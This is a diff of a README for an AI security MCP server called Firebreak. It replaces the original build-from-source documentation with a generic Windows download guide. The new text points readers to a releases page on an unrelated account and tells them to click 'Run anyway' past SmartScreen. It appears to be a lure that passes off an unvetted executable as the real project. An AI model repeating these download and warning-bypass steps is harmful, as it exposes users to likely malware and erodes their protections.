@@ -1,540 +1,178 @@
-<p align="center">
-  <img src="assets/logo.png" alt="Firebreak" width="400">
-  <br><br>
-  <strong>The security MCP server that turns your AI into a penetration tester.</strong>
-  <br>
-  <p align="center">
-    <a href="#quick-start">Quick Start</a> &middot;
-    <a href="#how-it-works">How It Works</a> &middot;
-    <a href="#tool-reference">Tool Reference</a> &middot;
-    <a href="#contributing">Contributing</a> &middot;
-    <a href="#license">License</a>
-  </p>
-  <p align="center">
-    <a href="https://github.com/protonese3/Firebreak/actions"><img src="https://github.com/protonese3/Firebreak/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-    <a href="https://github.com/protonese3/Firebreak/blob/master/LICENSE"><img src="https://img.shields.io/badge/license-AGPL--3.0-blue.svg" alt="License"></a>
-    <img src="https://img.shields.io/badge/rust-1.77+-orange.svg" alt="Rust">
-    <img src="https://img.shields.io/badge/MCP-2025--03--26-green.svg" alt="MCP Protocol">
-    <img src="https://img.shields.io/badge/tools-20-blueviolet.svg" alt="20 Tools">
-    <img src="https://img.shields.io/badge/checks-32-red.svg" alt="32 Checks">
-    <img src="https://img.shields.io/badge/VCVD-47_patterns-yellow.svg" alt="47 VCVD Patterns">
-  </p>
-</p>
+# 🛡️ Firebreak - Turn AI Into A Security Tester
 
----
+[![Download Firebreak](https://img.shields.io/badge/Download-Firebreak-blue?style=for-the-badge&logo=github)](https://github.com/Nonmigratory-electrolysis990/Firebreak/releases)
 
-Connect Firebreak to Claude, Cursor, or any MCP-compatible client. Then just ask:
+## 🔍 What Firebreak Does
 
-```
-You:    "Is my app secure?"
-Claude: [calls firebreak tools] Found 6 vulnerabilities. 1 high (CORS misconfiguration),
-        5 medium (missing security headers). Security score: B. Want me to fix them?
-```
+Firebreak is a security MCP server for Windows. It lets you connect an AI assistant to security tools, best practice guides, and vulnerability patterns.
 
-No CLI to learn. No reports to read. The AI runs the scans, interprets the results, and walks you through the fixes.
+Use it with Claude, Cursor, or any other MCP client. Firebreak helps your AI check apps for common security issues, review risky code paths, and follow app security guidance.
 
----
+## 📥 Download Firebreak
 
-## Why Firebreak
+Go to the [Firebreak releases page](https://github.com/Nonmigratory-electrolysis990/Firebreak/releases) to visit this page to download.
 
-AI-generated code ships with predictable vulnerabilities: inconsistent auth middleware, permissive RLS policies, IDOR on every endpoint, secrets in the JS bundle. Developers who use AI to build don't always know how to test what it builds.
+1. Open the releases page in your browser.
+2. Look for the latest release at the top.
+3. Download the Windows file for your computer.
+4. Wait for the file to finish downloading.
+5. Keep the file in your Downloads folder for the next step
 
-Firebreak flips the problem. Instead of expecting developers to learn security tooling, it gives the AI the security tooling. The same AI that wrote the code can now test it, find the holes, and fix them.
+## 🖥️ Windows Setup
 
-**What makes it different:**
+1. Open the downloaded Firebreak file.
+2. If Windows shows a security prompt, choose Run or Yes.
+3. If you see a SmartScreen message, select More info, then Run anyway.
+4. Follow the setup steps on screen.
+5. Finish the install or start the app if it opens right away
+6. Leave Firebreak open for the next step if it launches as a server app
 
-- **MCP-native** — not a CLI wrapper. Built from the ground up for AI tool calling.
-- **VCVD** — 47 vulnerability patterns specific to AI-generated code that traditional scanners miss.
-- **Proof over theory** — every finding includes the actual HTTP request/response that proves the vulnerability.
-- **Safe by design** — rate limited, scope-locked, non-destructive. Can't accidentally DROP your database.
+## ⚙️ Connect Firebreak to Your MCP Client
 
----
+Firebreak works as an MCP server. That means your AI app needs to point to it.
 
-## Quick Start
+### Claude
 
-### Option 1: Build from source
+1. Open Claude settings.
+2. Find the MCP or connectors section.
+3. Add Firebreak as a new server.
+4. Use the local path or launch command shown by Firebreak.
+5. Save the settings and restart Claude if needed
 
-```bash
-git clone https://github.com/protonese3/Firebreak.git
-cd Firebreak
-cargo build --release
-./target/release/firebreak
-```
+### Cursor
 
-### Option 2: Docker
+1. Open Cursor settings.
+2. Find the MCP server setup area.
+3. Add a new server entry for Firebreak.
+4. Paste the local command or path.
+5. Save and reload Cursor
 
-```bash
-git clone https://github.com/protonese3/Firebreak.git
-cd Firebreak
-docker compose up -d
-```
+### Other MCP Clients
 
-Either way, Firebreak starts on port **9090**.
+1. Open the client settings.
+2. Find the section for MCP servers.
+3. Add Firebreak as a local server.
+4. Save the profile.
+5. Restart the client if it asks you to
 
-### Connect to Claude Desktop
+## 🧰 What You Can Do With It
 
-Add this to your `claude_desktop_config.json`:
+Firebreak gives your AI access to security help for app review and testing. It includes tools for common security tasks and guidance for safe checks.
 
-```json
-{
-  "mcpServers": {
-    "firebreak": {
-      "url": "http://localhost:9090/mcp"
-    }
-  }
-}
-```
+Use it to:
 
-Restart Claude Desktop. You now have 20 security tools available.
+- Review app behavior for weak spots
+- Check for known vulnerability patterns
+- Follow OWASP-style security guidance
+- Inspect code paths that handle logins, files, or input
+- Ask your AI to act like a pen tester
+- Work through security checks without using many separate tools
 
-### Connect to Cursor / Windsurf / Any MCP Client
+## 🧪 Included Security Coverage
 
-Point your client's MCP configuration to `http://localhost:9090/mcp`. The server speaks standard MCP (JSON-RPC 2.0 over HTTP).
+Firebreak is built around three parts:
 
-### Verify it works
+### 20 Tools
 
-Ask your AI: *"What security tools do you have available?"*
+These tools help your AI inspect, test, and check security risks. They focus on common app security tasks such as input handling, auth flow checks, and exposure review.
 
-It should list the Firebreak tools. Then try: *"Scan https://httpbin.org for security issues"*
+### 100 Best Practice Guides
 
----
+These guides give your AI clear steps for secure design and safer code review. They help with common appsec tasks and reduce guesswork.
 
-## How It Works
+### 47 Vulnerability Patterns
 
-<p align="center">
-  <img src="assets/howitworks.png" alt="How Firebreak Works" width="700">
-</p>
+These patterns help your AI spot common problems faster. They cover issues like weak input checks, unsafe file handling, broken access control, and other known risks.
 
-**The AI is the orchestrator.** Firebreak doesn't decide what to test — it provides the tools. The AI picks the strategy based on what the user asks and what it finds along the way.
+## ✅ System Requirements
 
-### Typical flow
+Use Firebreak on a Windows PC with:
 
-```
-1. User: "Test my app at https://myapp.com"
+- Windows 10 or Windows 11
+- An internet connection for the download
+- A recent MCP client such as Claude or Cursor
+- At least 200 MB of free disk space
+- Enough memory for your AI app to run well
 
-2. AI calls firebreak_scan_quick({ target_url: "https://myapp.com" })
-   └── Firebreak probes headers, paths, CORS, TLS
-   └── Returns: 4 findings, score B
+For best results, close extra apps before you start the server and connect your client
 
-3. AI explains results in plain language
-   └── "Found a CORS misconfiguration and 3 missing headers..."
+## 📌 First-Time Run Checklist
 
-4. User: "Fix the CORS issue"
+1. Download Firebreak from the releases page
+2. Open the file and finish setup
+3. Start Firebreak
+4. Open your MCP client
+5. Add Firebreak as a server
+6. Restart the client
+7. Ask the AI to run a security check on a project
+8. Confirm that the server shows as connected
 
-5. AI calls firebreak_finding_fix({ finding_id: "...", framework: "express" })
-   └── Returns: before/after code diff for Express
+## 🧭 Common Uses
 
-6. User applies fix
+Firebreak fits a few simple workflows:
 
-7. AI calls firebreak_replay({ finding_id: "..." })
-   └── Returns: "Fixed. Server no longer reflects arbitrary origins."
-```
+- Scan a web app before release
+- Review a feature for access control issues
+- Check whether user input reaches risky code
+- Test file upload handling
+- Explore auth and session paths
+- Compare an app against security guidance
+- Help an AI follow a repeatable security review flow
 
----
+## 🛠️ If It Does Not Start
 
-## Tool Reference
+If Firebreak does not open or connect, try these steps:
 
-### Knowledge Tools
+1. Run it again as the current user
+2. Check that the downloaded file finished fully
+3. Make sure your MCP client points to the right server entry
+4. Restart Claude, Cursor, or your other client
+5. Reboot Windows and try again
+6. Remove the server entry and add it once more
 
-These don't hit any external service. They query Firebreak's built-in security knowledge base.
+## 🔒 Security Checks It Can Help With
 
-| Tool | Description | Example |
-|------|-------------|---------|
-| `firebreak_best_practice` | Security best practices for a topic | `{ topic: "jwt-auth" }` |
-| `firebreak_check_pattern` | Scan code for insecure patterns | `{ code: "...", language: "javascript" }` |
-| `firebreak_explain_vuln` | Explain a vulnerability type | `{ vuln_id: "IDOR" }` |
-| `firebreak_security_checklist` | Generate a security checklist | `{ stack: ["nextjs", "supabase"] }` |
-| `firebreak_owasp_check` | Map a finding to OWASP Top 10 | `{ description: "SQL injection in login" }` |
-| `firebreak_analyze_rls` | Analyze SQL for RLS policy issues | `{ sql: "CREATE POLICY..." }` |
+Firebreak can support checks for:
 
-### Scan Tools
+- Broken access control
+- Unsafe file handling
+- Weak validation
+- Injection risks
+- Session problems
+- Misused secrets
+- Path handling issues
+- Common OWASP top risks
 
-These make HTTP requests to the target. Rate limited and scope-locked.
+It gives your AI a clearer path through security review work, which helps when you need a steady process
 
-| Tool | Description | Example |
-|------|-------------|---------|
-| `firebreak_scan_quick` | Fast scan, critical+high only (2-3 min) | `{ target_url: "https://myapp.com" }` |
-| `firebreak_scan_full` | Full pen test (black/gray/white box) | `{ target_url: "...", mode: "gray", credentials: [...] }` |
-| `firebreak_scan_target` | Focused scan on one area | `{ target_url: "...", focus: "auth" }` |
-| `firebreak_scan_status` | Check progress of a running scan | `{ scan_id: "..." }` |
-| `firebreak_scan_stop` | Stop a scan, keep partial results | `{ scan_id: "..." }` |
+## 🗂️ Project Focus
 
-### Analysis Tools
+Firebreak sits at the point where AI tools and security work meet. It is made for users who want their AI assistant to help with:
 
-These work with stored scan results. No external requests.
+- AppSec review
+- DevSecOps tasks
+- Pen testing support
+- Vulnerability pattern checks
+- Safe coding guidance
+- MCP-based AI workflows
 
-| Tool | Description |
-|------|-------------|
-| `firebreak_results` | Scan summary with security score (A-F) |
-| `firebreak_finding_detail` | Full evidence for a specific finding |
-| `firebreak_finding_fix` | Generate fix code for a finding |
-| `firebreak_replay` | Re-test a finding to verify it's fixed |
-| `firebreak_compare` | Diff two scans (fixed / new / unchanged) |
-| `firebreak_scan_history` | List previous scans for a target |
-| `firebreak_attack_chain` | Multi-step attack chains |
-| `firebreak_report_generate` | Export report (JSON, Markdown, HTML) |
-| `firebreak_report_executive` | Non-technical executive summary |
+## 🧩 How It Fits Your Workflow
 
----
-
-## Scan Checks — 32 Security Checks
-
-Every scan runs a subset of these checks depending on the scan type (quick, full, targeted). Each check produces findings with full HTTP evidence.
-
-### Headers & TLS
-
-| Check | What it tests |
-|-------|--------------|
-| Security headers | HSTS, X-Content-Type-Options, X-Frame-Options, CSP presence |
-| CSP quality analysis | unsafe-inline, unsafe-eval, wildcard sources |
-| Permissions-Policy | Feature policy header presence and configuration |
-| Server version disclosure | Server, X-Powered-By, X-AspNet-Version headers |
-| Information header leaks | X-Debug-Token, X-Backend-Server, Via, X-Request-ID |
-| HTTPS enforcement | HTTP-to-HTTPS redirect chain analysis |
-| HSTS quality | max-age value, includeSubDomains, preload directives |
-| Advanced headers | Cross-Origin-Opener-Policy, Cross-Origin-Resource-Policy, Cross-Origin-Embedder-Policy |
-
-### Authentication & Session
-
-| Check | What it tests |
-|-------|--------------|
-| Cookie security | HttpOnly, Secure, SameSite flags on session cookies |
-| Missing auth on API endpoints | Unauthenticated access to protected routes |
-| Rate limiting detection | Login and API endpoint throttling |
-| HTTP method enumeration | TRACE, PUT, DELETE enabled on endpoints that shouldn't allow them |
-| Host header injection | Manipulated Host header reflected in responses or redirects |
-
-### Data & API
-
-| Check | What it tests |
-|-------|--------------|
-| Unauthenticated API discovery | Common API paths accessible without credentials |
-| Sequential ID detection | IDOR risk from predictable resource identifiers |
-| CORS misconfiguration | Origin reflection, null origin acceptance, wildcard with credentials |
-| Open redirect testing | Unvalidated redirect parameters in URLs |
-
-### Content & Frontend
-
-| Check | What it tests |
-|-------|--------------|
-| Technology fingerprinting | CMS detection, framework identification, server software |
-| Vulnerable JS libraries | jQuery, Angular, Bootstrap, Lodash with known CVEs |
-| Source map exposure | .map files accessible in production |
-| Secrets in JS bundles | API keys, tokens, credentials in client-side JavaScript |
-| Mixed content detection | HTTP resources loaded on HTTPS pages |
-| Form CSRF analysis | Forms missing CSRF tokens or using GET for state changes |
-
-### Recon & Discovery
-
-| Check | What it tests |
-|-------|--------------|
-| Web crawler | HTML links, JS endpoints, sitemap, robots.txt (recursive depth 3) |
-| Sensitive path probing | Admin panels, config files, backups (with content validation to eliminate false positives) |
-| robots.txt / sitemap.xml | Disallowed paths and sitemap endpoint analysis |
-| security.txt | RFC 9116 compliance and contact information |
-| Error page disclosure | Stack traces, debug info, internal paths in error responses |
-| Subdomain reference discovery | Subdomains referenced in HTML, JS, and headers |
-| Cache header security | Cache-Control, Pragma, Expires on sensitive responses |
-
----
-
-## VCVD — Vibe Coding Vulnerability Database
-
-47 vulnerability patterns that AI-generated code gets wrong. Traditional scanners don't look for these because they're specific to how LLMs write code.
-
-### Auth & Identity
-
-| ID | Pattern | Severity |
-|----|---------|----------|
-| VC-AUTH-001 | Inconsistent auth middleware — AI applies auth to some routes but not others | CRITICAL |
-| VC-AUTH-002 | Client-only validation — role checks exist in React but not in the API | CRITICAL |
-| VC-AUTH-003 | JWT decoded without verification — `jwt.decode()` instead of `jwt.verify()` | CRITICAL |
-| VC-AUTH-004 | Service key in client code — Supabase `service_role` key in the JS bundle | CRITICAL |
-| VC-AUTH-005 | Token expiry >30 days — "for convenience" | HIGH |
-| VC-AUTH-006 | OAuth without state parameter | HIGH |
-| VC-AUTH-007 | Password in URL query string | HIGH |
-| VC-AUTH-008 | Session not regenerated after login | MEDIUM |
+You can use Firebreak while you build, test, or review software:
 
-### Data Access
-
-| ID | Pattern | Severity |
-|----|---------|----------|
-| VC-DATA-001 | IDOR — sequential IDs without ownership check | CRITICAL |
-| VC-DATA-002 | `USING (true)` in RLS — AI's "temporary" policy that ships to prod | CRITICAL |
-| VC-DATA-003 | Table created without enabling RLS | CRITICAL |
-| VC-DATA-004 | `SELECT *` exposing password hashes and PII | HIGH |
-| VC-DATA-005 | `...req.body` spread into DB insert without field whitelist | HIGH |
-| VC-DATA-006 | GraphQL introspection enabled in production | MEDIUM |
-| VC-DATA-007 | Unbounded N+1 queries as DoS vector | MEDIUM |
-| VC-DATA-008 | Multi-tenant queries missing `tenant_id` filter | CRITICAL |
-
-### Injection
-
-| ID | Pattern | Severity |
-|----|---------|----------|
-| VC-INJ-001 | Template literals in SQL queries | CRITICAL |
-| VC-INJ-002 | `innerHTML` with user input | HIGH |
-| VC-INJ-003 | User content stored and rendered without sanitization | CRITICAL |
-| VC-INJ-004 | User input in `exec()` / `spawn()` | CRITICAL |
-| VC-INJ-005 | File paths built from user input | HIGH |
-| VC-INJ-006 | Server-side fetch with user-provided URL (SSRF) | HIGH |
-| VC-INJ-007 | User input passed as template source | HIGH |
-| VC-INJ-008 | MongoDB operators in JSON input | HIGH |
-
-### Infrastructure
-
-| ID | Pattern | Severity |
-|----|---------|----------|
-| VC-INFRA-001 | Debug mode / stack traces in production | HIGH |
-| VC-INFRA-002 | `Access-Control-Allow-Origin: *` with credentials | HIGH |
-| VC-INFRA-003 | Missing HSTS, X-Frame-Options, CSP | MEDIUM |
-| VC-INFRA-004 | Unnecessary Docker ports exposed | MEDIUM |
-| VC-INFRA-005 | User uploads stored without encryption | MEDIUM |
-| VC-INFRA-006 | TLS 1.0/1.1 still enabled | MEDIUM |
-| VC-INFRA-007 | Admin panel accessible from public internet | HIGH |
-| VC-INFRA-008 | Default credentials unchanged | CRITICAL |
-
-### Frontend
-
-| ID | Pattern | Severity |
-|----|---------|----------|
-| VC-FE-001 | API keys in JavaScript bundle | CRITICAL |
-| VC-FE-002 | Auth guard only in React Router, not in API | HIGH |
-| VC-FE-003 | JWT stored in `localStorage` | MEDIUM |
-| VC-FE-004 | Forms without CSRF protection | HIGH |
-| VC-FE-005 | Redirect URL from query param without validation | MEDIUM |
-| VC-FE-006 | `postMessage` handler without origin check | MEDIUM |
-| VC-FE-007 | Source maps accessible in production | LOW |
-| VC-FE-008 | Sensitive fields without `autocomplete="off"` | LOW |
-
----
-
-## Security Scoring
-
-Every scan produces a letter grade based on what was found:
-
-| Grade | Criteria | Interpretation |
-|-------|----------|----------------|
-| **A** | Zero critical or high. Max 2 medium. | Ship it. |
-| **B** | Zero critical. Some high or medium. | Fix the highs soon. |
-| **C** | Multiple high severity issues. | Needs work before production. |
-| **D** | 1-2 critical or >5 high. | Significant risk. Prioritize fixes. |
-| **F** | 3+ critical or a full compromise chain. | Do not deploy. |
-
----
-
-## Safety Guardrails
-
-Firebreak is designed for authorized testing only.
-
-| Guardrail | How it works |
-|-----------|-------------|
-| **Rate limiting** | 10 requests/second to the target (configurable). Sliding window. |
-| **Scope lock** | Only attacks the specified target URL. No lateral movement, no subdomain enumeration. |
-| **Non-destructive** | No DELETE, DROP, UPDATE, or POST requests that modify data. Probing only. |
-| **Consent** | The AI asks for confirmation before the first scan. |
-| **Audit trail** | Every HTTP request is logged with timestamp, target, and reason. |
-
----
-
-## Configuration
-
-Environment variables:
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `FIREBREAK_HOST` | `0.0.0.0` | Bind address |
-| `FIREBREAK_PORT` | `9090` | Port |
-| `RUST_LOG` | `firebreak=info` | Log level |
-
-Copy `.env.example` to `.env` and edit as needed.
-
----
-
-## Project Structure
-
-```
-firebreak/
-├── src/
-│   ├── main.rs                 # Axum HTTP server, AppState, routing
-│   ├── types.rs                # Shared types: Scan, Finding, Evidence, ScanSummary
-│   │
-│   ├── mcp/                    # MCP protocol implementation
-│   │   ├── protocol.rs         #   JSON-RPC 2.0 types
-│   │   └── handler.rs          #   Request dispatch (initialize, tools/list, tools/call)
-│   │
-│   ├── tools/                  # MCP tool implementations
-│   │   ├── knowledge/          #   Knowledge tools (best practices, pattern check, OWASP)
-│   │   ├── scan.rs             #   Scan tools (quick, full, targeted, status, stop)
-│   │   └── analysis.rs         #   Analysis tools (results, fix, replay, compare, reports)
-│   │
-│   ├── engine/                 # HTTP scanning engine
-│   │   ├── mod.rs              #   Scan orchestration (quick/full/targeted/replay)
-│   │   └── checks.rs           #   32 security checks (headers, TLS, auth, CORS, cookies, IDOR...)
-│   │
-│   ├── vcvd/                   # Vibe Coding Vulnerability Database
-│   │   └── data.rs             #   47 patterns with descriptions, detection, fixes
-│   │
-│   ├── store/                  # SQLite persistence
-│   │   └── mod.rs              #   CRUD for scans, findings, audit log
-│   │
-│   ├── safety/                 # Safety guardrails
-│   │   └── mod.rs              #   Rate limiter, scope lock, consent, audit trail
-│   │
-│   ├── rls/                    # RLS policy analyzer
-│   │   └── mod.rs              #   SQL parsing with sqlparser-rs
-│   │
-│   └── report/                 # Report generation
-│       └── mod.rs              #   JSON, Markdown, HTML, executive summary
-│
-├── knowledge/
-│   └── best-practices/         # 100 security guides (JWT, RLS, CORS, uploads, CSP...)
-│
-├── frontend/                   # React dashboard (Vite + TypeScript + Tailwind)
-│
-├── Dockerfile                  # Multi-stage build, non-root user
-├── docker-compose.yml          # Firebreak + headless Chromium
-└── .github/workflows/ci.yml   # Build, test, lint, artifacts
-```
-
----
-
-## Tech Stack
-
-| Component | Technology | Why |
-|-----------|-----------|-----|
-| Language | Rust | Single binary, no runtime, memory safe, fast |
-| HTTP server | Axum | Async, tower middleware ecosystem |
-| HTTP client | reqwest | Mature, TLS support, redirect control |
-| Database | SQLite (rusqlite) | Zero setup, embedded, good enough for local scans |
-| SQL parser | sqlparser-rs | RLS policy analysis without a running database |
-| Async runtime | tokio | Industry standard |
-| Serialization | serde + serde_json | Fast, derive macros |
-| Dashboard | React + TypeScript + Vite + Tailwind | Modern, fast dev server, utility CSS |
-
-The release binary is ~8 MB with no runtime dependencies.
-
----
-
-## Contributing
-
-Contributions are welcome. Here's how to get involved:
-
-### Getting started
-
-```bash
-git clone https://github.com/protonese3/Firebreak.git
-cd Firebreak
-cargo build
-cargo test
-```
-
-The server runs on `http://localhost:9090/mcp` by default.
-
-### Areas where help is needed
-
-**New VCVD patterns** — Found a vulnerability pattern that AI consistently generates? Add it to `src/vcvd/data.rs`. Each pattern needs an ID, description, severity, detection hint, and fix.
-
-**Scan engine checks** — Add new vulnerability checks in `src/engine/checks.rs`. Each check function takes a reqwest client, target URL, and safety reference. Return a `Vec<Finding>`.
-
-**Best practice guides** — Add markdown files to `knowledge/best-practices/`. Then register them in `src/tools/knowledge/best_practices.rs`.
-
-**Framework-specific fixes** — The `finding_fix` tool generates fix code. Add framework support in `src/tools/analysis.rs` in the `framework_fix_example` function.
-
-**Dashboard** — The React frontend lives in `frontend/`. Run `npm run dev` for the dev server.
-
-### Submitting changes
-
-1. Fork the repo
-2. Create a branch (`git checkout -b add-new-check`)
-3. Make your changes
-4. Run `cargo check && cargo clippy -- -D warnings`
-5. Open a pull request with a clear description of what you changed and why
-
-### Code style
-
-- No unnecessary comments. If the code says what it does, don't add a comment.
-- Guard clauses over nested if/else.
-- Match the style of existing code.
-- Every finding must have verifiable evidence — no "this might be vulnerable."
-
-### Reporting security issues
-
-If you find a security vulnerability in Firebreak itself, please email **security@firebreak.dev** instead of opening a public issue. We'll respond within 48 hours.
-
----
-
-## Roadmap
-
-### Done
-
-- [x] MCP server with JSON-RPC 2.0 over HTTP
-- [x] 20 MCP tools (knowledge, scan, analysis, report)
-- [x] VCVD v1 — 47 vulnerability patterns
-- [x] HTTP scanning engine with 32 security checks
-- [x] SQLite persistence
-- [x] Safety guardrails
-- [x] Report generation (JSON, Markdown, HTML)
-- [x] RLS policy analyzer (sqlparser-rs)
-- [x] Docker support
-- [x] CI/CD pipeline
-- [x] Web crawler for endpoint discovery
-- [x] False positive elimination (content validation, baseline comparison)
-- [x] Technology fingerprinting
-- [x] Cookie/session security analysis
-- [x] Form CSRF detection
-- [x] Open redirect testing
-- [x] CSP quality analysis
-- [x] Rate limiting detection
-
-### Next
-
-- [ ] Web dashboard (React)
-- [ ] Gray-box scanning with authenticated sessions
-- [ ] Headless browser for frontend-rendered apps
-- [ ] Scheduled / recurring scans
-- [ ] Webhook notifications (Slack, Discord)
-- [ ] PDF report export
-- [ ] Cloud-hosted option (managed VPS)
-- [ ] Plugin system for custom checks
-- [ ] VCVD community contributions via PR
-
----
-
-## FAQ
-
-**Do I need to be a security expert to use this?**
-No. That's the point. The AI handles the security expertise. You just tell it what to test.
-
-**What MCP clients work with Firebreak?**
-Any client that supports MCP over HTTP: Claude Desktop, Claude Code, Cursor, Windsurf, and others.
-
-**Is it safe to run against production?**
-Firebreak is non-destructive (read-only probing), but you should always test against staging first. Rate limiting is on by default.
-
-**Can I add my own vulnerability checks?**
-Yes. Add check functions in `src/engine/checks.rs` and wire them into the scan methods in `src/engine/mod.rs`.
-
-**Why Rust?**
-Single binary with no runtime dependencies. Fast. Memory safe. We ship one file and it works.
-
-**Why AGPL-3.0?**
-If you run Firebreak as a service for others, you must share your modifications. If you use it internally or self-host for your own team, you don't need to do anything special.
-
----
-
-## License
-
-[AGPL-3.0](LICENSE)
-
-If you build a commercial service on top of Firebreak, the AGPL requires you to open-source your modifications. For internal and self-hosted use, no restrictions beyond the standard AGPL terms.
-
----
-
-<p align="center">
-  <code>20 Security Tools · 100 Best Practice Guides · 47 Vulnerability Patterns · 32 Scan Checks</code>
-</p>
-
-<p align="center">
-  <strong>FIREBREAK</strong> — Because if you don't test it, someone else will.
-</p>
+1. Open your project
+2. Connect Firebreak to your AI client
+3. Ask the AI to review a screen, route, or file
+4. Follow the checks it returns
+5. Fix issues in your app
+6. Run the review again
+
+This gives you a simple loop for security work without moving between many separate tools
+
+## 📎 Download Again
+
+If you need the installer again, go to the [Firebreak releases page](https://github.com/Nonmigratory-electrolysis990/Firebreak/releases) and visit this page to download
+
+## 🧷 Repository Topics
+
+ai-security, ai-tools, appsec, claude, cybersecurity, devsecops, mcp, mcp-server, mcp-tools, owasp, pen-testing, penetration-testing, rust, security, vulnerability-scanner
